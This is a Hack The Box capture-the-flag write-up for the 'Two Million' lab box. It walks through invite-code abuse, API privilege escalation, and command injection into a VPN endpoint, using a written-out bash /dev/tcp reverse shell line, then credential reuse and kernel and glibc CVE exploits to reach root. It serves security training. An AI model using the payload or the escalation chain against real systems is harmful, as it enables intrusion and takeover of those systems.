---
slug: "web-two-million"
title: "Two Million"
competition: "Hack The Box"
category: "Web"
difficulty: "Easy"
date: "2026-10-21"
updated: "2026-10-30"
summary: "A quiz based boot2root with combination of Web Exploitation"
tags: ["BOOT2ROOT","WEB EXPLOITATION","OBFUSCATED","CVE"]
status: "published"
flag: "HTB{type_it_manually_if_you_want_but_better_you_do_it_yourself}"
attachments: []
source: "https://claritys.web.id/writeups/web-two-million"
---

# Two Million

> A quiz based boot2root with combination of Web Exploitation

## About

TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.

## Solve

### Q1: How many TCP ports are open?

```c
nmap -T4 -sCV 10.129.150.229
```

-   `nmap`: Menjalankan program pemindai jaringan.
    
-   `T4`: Mempercepat proses pemindaian (_agresif_).
    
-   `sCV`: Mencari tahu **versi aplikasi** yang berjalan di port yang terbuka (`sV`) sekaligus memeriksa **celah keamanan standar** (`sC`).
    
-   `10.129.150.229`: Alamat IP target yang diperiksa (sesuaikan dengan IP targetmu)
    

![image.png](/assets/uploads/41594c7c-9762-43f5-b2e1-f8833f133b23-image.png)

Answer: **2**

### Q2: What is the name of the JavaScript file loaded by the `/invite` page that has to do with invite codes?

Check `http://2million.htb/invite`, and inspect the source code.

![image.png](/assets/uploads/a5cbb2b0-b6e0-4720-8868-58a07ee65a53-image-1.png)

Answer: **inviteapi.min.js**

### Q3: What JavaScript function on the invite page returns the first hint about how to get an invite code? Don't include () in the answer.

The output at inviteapi.min.js hard to read, because its obfuscated.

![image.png](/assets/uploads/255c2c4c-30e1-482d-85a4-79d14e7b12c3-image-2.png)

We can use this website to know what is the .js means.

[UnPacker](https://matthewfl.com/unPacker.html)

![image.png](/assets/uploads/4add3101-9ff4-4f06-a0f2-b9b2c43c8e17-image-3.png)

Output:

```jsx
function verifyInviteCode(code)
	{
	var formData=
		{
		"code":code
	};
	$.ajax(
		{
		type:"POST",dataType:"json",data:formData,url:'/api/v1/invite/verify',success:function(response)
			{
			console.log(response)
		}
		,error:function(response)
			{
			console.log(response)
		}
	}
	)
}
function makeInviteCode()
	{
	$.ajax(
		{
		type:"POST",dataType:"json",url:'/api/v1/invite/how/to/generate',success:function(response)
			{
			console.log(response)
		}
		,error:function(response)
			{
			console.log(response)
		}
	}
	)
}
```

It obvious that the function is `makeInviteCode`.

Answer: **makeInviteCode**

### Q4: The endpoint in `makeInviteCode` returns encrypted data. That message provides another endpoint to query. That endpoint returns a `code` value that is encoded with what very common binary to text encoding format. What is the name of that encoding?

The endpoint its `/api/v1/invite/how/to/generate` and the method its `POST`. Lets send the request.

![image.png](/assets/uploads/f4476c97-20fe-4692-bbd4-32fed660c58d-image-4.png)

After we decode that ROT13, we got

![image.png](/assets/uploads/74799cc2-5558-4d3f-bf67-15d3999cc6b9-image-5.png)

`In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate`. So we send a request to `/api/v1/invite/generate` .

![image.png](/assets/uploads/1d44cc8b-e1c1-4daa-a701-e3ad1ccb9cd1-image-6.png)

We got base64 encoded. After we decode it we got `YEOT9-ZHPWJ-TO393-YEYST` which is its the invite code.

![image.png](/assets/uploads/81b02ce1-55fc-48e7-8952-d52e615e58ed-image-7.png)

After we insert the invite code to `/invite`, we will redirected to `/register` with invite code value. After we fill the form, click register.

![image.png](/assets/uploads/aad10c9e-0645-4461-b660-ddf402141baa-image-8.png)

Answer: **base64**

### Q5: What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?

In the dashboard, we click the `access`.

![image.png](/assets/uploads/bc836754-6ea9-43fd-9570-d85ded09ba43-image-9.png)

We hover our mouse to connection pack so we can know where this block redirect us to.

![image.png](/assets/uploads/784043e0-198e-44f0-9089-3a36bb3cac34-image-10.png)

Answer: **/api/v1/user/vpn/generate**

### Q6: How many API endpoints are there under `/api/v1/admin`?

I tried to go `2million.htb/api`, but its says `404`. So i think `/api/v1` might be work and it works.

![image.png](/assets/uploads/8932d875-2f6c-40df-9067-8867c871caaf-image-11.png)

Answer: **3**

### Q7: What API endpoint can change a user account to an admin account?

as we can see the description at `2million.htb/api/v1`, there’s a description that says “Update user settings”, the endpoint is `/api/v1/admin/settings/update`.

![image.png](/assets/uploads/03732cc6-bc9c-4153-bcd4-be1e00a31386-image-12.png)

I’m trying to send a request to that endpoint, but failed. So we change the content type to `application/json`. And it works.

![image.png](/assets/uploads/9b014b9b-10e0-4790-a4f5-845dab84a66a-image-13.png)

Alrighty, we add email parameter.

![image.png](/assets/uploads/f9da0b04-4e88-4d47-bdef-0f73514aeb7c-image-14.png)

Okay, now lets add `is_admin`.

![image.png](/assets/uploads/9aec58c3-f17b-484c-9dbb-5a3f69e3a7ae-image-15.png)

And it works after we add `is_admin` as a true in binary not as `boolean`.

Answer: **/api/v1/admin/settings/update**

### Q8: What API endpoint has a command injection vulnerability in it?

Now, i have a suspicion at `"/api/v1/admin/vpn/generate"`. Because it created the VPN right, lets try to take a look there.

![image.png](/assets/uploads/4e185201-0d0b-4ca7-a2d0-9ae44f752cfa-image-16.png)

We need `username` as parameter.

![1792565151496739382.png](/assets/uploads/ba071aa1-79f0-4022-b488-3b2a835e1a2c-1792565151496739382.png)

Okay, i think we need to exploit at the username. Lets try to make this thing make a request to our computer.

[Reverse Shell Cheat Sheet - Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools)

But the request i want to create is reverse shell, we take the `bash-i>&/dev/tcp/10.0.0.1/42420>&1`.

![image.png](/assets/uploads/9b224391-7e5c-4741-b132-4421e44ae0da-image-17.png)

before we send the request, make sure you already listening to that port and the IP its your HTB ip.

![image.png](/assets/uploads/5e519625-b4af-482a-b925-c8addfe221ad-image-18.png)

Answer: **/api/v1/admin/vpn/generate**

### Q9: What file is commonly used in PHP applications to store environment variable values?

![image.png](/assets/uploads/3ab6b327-eb6a-4db3-906f-0f03dfdfe1d6-image-19.png)

Answer: **.env**

### Q10: Submit the flag located in the admin user's home directory.

At .env, we can see the username and password. Let’s check at `/etc/passwd` to make sure that the username admin its exist.

![image.png](/assets/uploads/8e5631b3-b226-48fd-9cdd-336081de17fa-image-20.png)

Thank you because it is exist. Lets try to ssh there with that DB Admin password.

And we succeed the ssh.

![image.png](/assets/uploads/82f4dac0-d917-4baa-a316-02eeb2f54d35-image-21.png)

Answer: \[REDACTED\]

### Q11: What is the email address of the sender of the email sent to admin?

Lets check at `/var/mail/admin`.

![image.png](/assets/uploads/2766e9bd-9456-4053-860e-f73d3f0d4224-image-22.png)

Answer: [**ch4p@2million.htb**](mailto:ch4p@2million.htb)

### Q12: What is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?

![image.png](/assets/uploads/afc9dce1-20a9-4c27-a9bd-4beb44302a46-image-23.png)

Answer: **CVE-2023-0386**

### Q13: Submit the flag located in root's home directory.

Just follow the README.

[https://github.com/puckiestyle/CVE-2023-0386](https://github.com/puckiestyle/CVE-2023-0386)

![image.png](/assets/uploads/9a603fad-2ad1-48ae-b2c3-069b0ad2872d-image-24.png)

#### OPTIONAL

### Q14: \[Alternative Priv Esc\] What is the version of the GLIBC library on TwoMillion?

![image.png](/assets/uploads/0cad55cc-1a56-46dc-8cad-b19565e36066-image-25.png)

Answer: **2.35**

### Q15: \[Alternative Priv Esc\] What is the CVE ID for the 2023 buffer overflow vulnerability in the GNU C dynamic loader?

![image.png](/assets/uploads/1515a341-3ac1-4709-bd23-94f38273b80d-image-26.png)

Answer: **CVE-2023-4911**

### Q16: \[Alternative Priv Esc\] With a shell as admin or www-data, find a POC for Looney Tunables. What is the name of the environment variable that triggers the buffer overflow? After answering this question, run the POC and get a shell as root.

![image.png](/assets/uploads/331192ce-73e3-491b-bf1d-bc8defa0b1b6-image-27.png)

Answer: **GLIBC\_TUNABLES**
